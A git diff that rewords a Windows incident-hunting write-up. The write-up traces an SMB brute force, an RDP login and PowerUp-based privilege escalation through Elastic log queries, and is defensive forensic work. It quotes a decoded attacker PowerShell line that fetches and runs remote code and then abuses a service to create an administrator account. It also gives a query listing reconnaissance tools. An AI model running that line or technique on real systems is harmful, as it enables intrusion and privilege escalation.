@@ -64,7 +64,7 @@ Query : ((winlog.logon.id : 0x893c5f) OR (winlog.event_data.LogonId : 0x893c5f))
 
 The event of particular interest here is the logon event where "**mark**" explicitly logs in as "**john**" with a LogonType of 2, which could suggest the use of a "**runas**" command.
 
-Now that we've established that all the intriguing and suspicious activities initiated by "**john**" trace back to "**mark**," let's continue our investigation by tracking the **LogonID** associated with the subject user "**mark**" to gather further information:
+Now that we've determined all the suspicious activities initiated by "john" can be traced back to "mark," let's continue our investigation. We'll track the LogonID associated with "mark" to gather more information:
 
 ```yaml
 Query : (([winlog.logon.id](http://winlog.logon.id/) : 0x6fe292) OR (winlog.event_data.LogonId : 0x6fe292)) AND event.code:(1 OR 4688)
@@ -103,19 +103,18 @@ Here we have some intriguing findings:
         Decoded base64 part: `IEX (New-Object Net.Webclient).DownloadString('<http://127.0.0.1:38223/>'); Invoke-ServiceAbuse -Name 'SNMP'`
         
 
-These findings present us with another hypothesis to explore later, involving PowerShell event logs, which could potentially yield more artifacts.
-
+These findings give us another hypothesis to explore later: examining PowerShell event logs, which could reveal more artifacts.
 However, let's stay focused on our current goal. We should now examine the logon event associated with this particular **logonID** :
 
 ![Untitled](./pictures/6.png)
 
-We've come across a constraint in our ability to trace the subject user's logonID, as it pertains to the local system itself. However, this presents an opportunity rather than a setback. We can take note of this information and leverage it to construct more inquiries and hypotheses for our ongoing investigation.
+We've encountered a limitation in tracing the subject user's LogonID because it relates to the local system itself. However, this isn't a setback; it's an opportunity. We can use this information to develop further inquiries and hypotheses as we continue our investigation.
 
-Specifically, it seems that "mark" has instigated the suspicious activities we've identified. Consequently, we can proceed with the assumption that "mark" is the compromised user and proceed with a thorough examination of events leading up to this logon:
+Specifically, It appears that "mark" is responsible for the suspicious activities we've identified. Based on this, we can assume that "mark" is the compromised user. We'll now conduct a thorough examination of the events leading up to this logon:
 
 ![Untitled](./pictures/7.png)
 
-Upon filtering by **[user.name](http://user.name/):mark**, we observed a potential brute force pattern involving the "**mark**" user from the IP address **192.168.11.18**. Interestingly, this IP is the same one from which we identified that "**mark**" downloaded something using a PowerShell command. Notably, the brute force attempts culminated in a **successful login**.
+Upon filtering by **user.name:mark**, we observed a potential brute force pattern involving **mark** user from the IP address **192.168.11.18**. Interestingly, this IP is the same one from which we identified that "**mark**" downloaded something using a PowerShell command. Notably, the brute force attempts eventually resulted in a **successful login**.
 
 Subsequently, we noted an **RDP** login from IP address **192.168.11.55**.
 
@@ -125,7 +124,7 @@ With this information in hand, let's now investigate the type of activity origin
 
 ![Untitled](./pictures/9.png)
 
-We've observed an intriguing pattern: following a successful login from a brute force attempt, there's immediate access to the \\*\IPC$ ShareName within the same minute. This strongly suggests that the brute force attack was conducted using the **SMB** (Server Message Block) protocol, potentially through a tool like **CrackMapExec**.
+We've noticed something interesting: right after a successful brute force login, there was immediate access to the \\*\IPC$ ShareName within the same minute. This suggests the brute force attack was likely done using the **SMB** (Server Message Block) protocol, possibly with a tool like **CrackMapExec**.
 
 To further validate this hypothesis, I conducted an internet search and came across an event ID related to SMB authentication, which is event ID **551**:
 
@@ -137,26 +136,28 @@ Additionally, we've observed that the attacker proceeded to list the **Users** a
 
 ![Untitled](./pictures/11.png)
 
-We have successfully accomplished our first goal, which was to determine how the intruder gained access to the network.
-
-Here is the timeline of events:
+We have now successfully achieved our first goal: determining how the intruder gained access to the network.
+We have successfully achieved our first goal of determining how the intruder gained access to the network. Here’s the timeline of events:
 
 **Initial Access:**
 
-- Occurred on May 1, 2023, between 23:21:09.368 and 23:21:09.748.
-- The attacker employed a brute force attack utilizing the SMB protocol, targeting the "mark" username, and successfully gained access.
+- **Date:** May 1, 2023
+- **Time:** Between 23:21:09.368 and 23:21:09.748
+- **Details:** The attacker used a brute force attack with the SMB protocol to target the "mark" username and successfully gained access.
 
 **Subsequent Activity:**
 
-- On May 1, 2023, at 23:32:27.084, there was a login via RDP from IP address 192.168.11.55 to the BASTION Workstation.
-- As a result, the attacker now possesses access to the BASTION workstation through the "mark" account. Their potential next steps could include enumeration, privilege escalation, and lateral movement within the domain.
+- **Date:** May 1, 2023
+- **Time:** 23:32:27.084
+- **Details:** There was a login via RDP from IP address 192.168.11.55 to the BASTION workstation.
+- **Impact:** The attacker now has access to the BASTION workstation using the "mark" account. Their next steps may include enumeration, privilege escalation, and lateral movement within the domain.
 
-Our next objective is to track and investigate the actions taken by the attacker following their RDP login.
+Our next objective is to track and investigate the actions taken by the attacker after their RDP login.
 
-# Objective 2: Our second objective is to trace the activities of the compromised account "**mark**" and understand how the attacker moved in the network.
+# Objective 2: Our second goal is to trace the activities of the compromised account **mark** and understand how the attacker moved through the network.
 
 Hypothesis :
-The attacker utilized the compromised "**mark**" account for **internal reconnaissance** within the network.
+The attacker used the compromised "**mark**" account for **internal reconnaissance** within the network.
 
 To initiate our investigation into **internal reconnaissance**, we will begin by employing CAR analytics, specifically focusing on "CAR-2013-04-002: Quick execution of a series of suspicious commands." You can find more details about this analytics approach at [CAR-2013-04-002](https://car.mitre.org/analytics/CAR-2013-04-002/).
 
@@ -164,7 +165,7 @@ To initiate our investigation into **internal reconnaissance**, we will begin by
 Query : event.code:(1 OR 4688) AND process.executable:(*arp.exe* OR *at.exe* OR *attrib.exe* OR *cscript.exe* OR *dsquery.exe* OR *hostname.exe* OR *ipconfig.exe* OR *nbstat.exe* OR *net.exe* OR *net1.exe* OR *netsh.exe* OR *nslookup.exe* OR *ping.exe* OR *quser.exe* OR *qwinsta.exe* OR *reg.exe* OR *runas.exe* OR *sc.exe* OR *ssh.exe* OR *systeminfo.exe* OR *taskkill.exe* OR *telnet.exe* OR *tracert.exe* OR *wscript.exe* OR *xcopy.exe* OR *whoami.exe*)
 ```
 
-When we filter the results by examining the created processes, we uncover some intriguing findings:
+When we filter the results by examining the created processes, we find some intriguing discoveries:
 
 ![Untitled](./pictures/12.png)
 
@@ -182,7 +183,7 @@ To gain a deeper understanding of these events, we will proceed by tracking the 
 
 ![Untitled](./pictures/14.png)
 
-We will commence by examining the initial process based on its timestamp and tracing its parent process ID :
+We'll start by examining the initial process based on its timestamp and tracing its parent process ID.
 
 Queries :
 
@@ -217,11 +218,10 @@ Since we intend to track all the noteworthy processes created later, let's initi
 ![Untitled](./pictures/18.png)
 
 
-As we examine the files, we come across an intriguing one named "**PowerUp.ps1**." This file serves as a tool designed to facilitate quick checks for potential privilege escalation opportunities on a Windows machine.
-
+We find an interesting file named "**PowerUp.ps1**." This file is a tool used to quickly check for potential privilege escalation opportunities on a Windows machine.
 It's plausible that this script was downloaded from the C2 server at **192.168.11.18**.
 
-To comprehend the script's behavior, we will refer to the provided [cheat sheet](https://blog.certcube.com/powerup-cheatsheet/). There are essential phases involved in executing the script that will help us detect its actions:
+To understand the script's behavior, we’ll refer to the provided [cheat sheet](https://blog.certcube.com/powerup-cheatsheet/). This will help us identify the key phases of the script’s execution and detect its actions :
 
 1. Importing the "**PowerUp.ps1**" module.
 2. Running all the checks included in the module using the command **Invoke-AllChecks**.
@@ -235,11 +235,11 @@ Query : event.code:(800) AND powershell.command.value:("*Invoke-AllChecks*" OR "
 
 ![Untitled](./pictures/19.png)
 
-As we can discern, the attacker's intention was to exploit the SNMP service.
+It’s clear that the attacker aimed to exploit the SNMP service.
 
-Referring to the [cheat sheet](https://blog.certcube.com/powerup-cheatsheet/), when the command **Invoke-ServiceAbuse -Name 'TargetServiceName'** is executed without customizing the script (as is the case here), it results in the creation of a user named **john** with the password **Password123!**. Furthermore, this user is added to the local group **administrators**.
+According to the [cheat sheet](https://blog.certcube.com/powerup-cheatsheet/), executing the command **Invoke-ServiceAbuse -Name 'TargetServiceName'** without modifying the script creates a user named **john** with the password **Password123!**. This user is then added to the local **administrators** group.
 
-Recall that when we initially embarked on our hunt for **internal reconnaissance**, we made the following observations:
+Remember, when we first started our hunt for **internal reconnaissance**, we observed the following:
 
 - The user "**john**" was created by the SYSTEM.
 - "**john**" was added to the Administrators local group on the Bastion workstation.
